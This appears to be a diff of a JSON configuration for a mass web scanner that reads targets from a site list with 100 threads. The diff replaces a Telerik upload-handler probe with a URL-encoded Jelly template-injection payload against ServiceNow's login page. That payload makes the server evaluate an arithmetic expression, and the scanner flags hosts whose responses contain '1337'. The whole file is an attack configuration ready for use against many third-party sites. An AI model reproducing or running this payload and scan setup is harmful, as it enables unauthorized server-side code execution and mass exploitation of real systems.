@@ -1,13 +1,13 @@
 {
   "threads": 100,
   "siteList": "sites.txt",
-  "outputList": "tele.txt",
+  "outputList": "137le.txt",
   "timeout": 15,
   "paths": [
-    "/Telerik.Web.UI.WebResource.axd?type=rau"
+    "/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(668.5*2);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
   ],
   "contents": [
-    "RadAsyncUpload"
+    "1337"
   ],
   "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
   "iterationDelay": 30
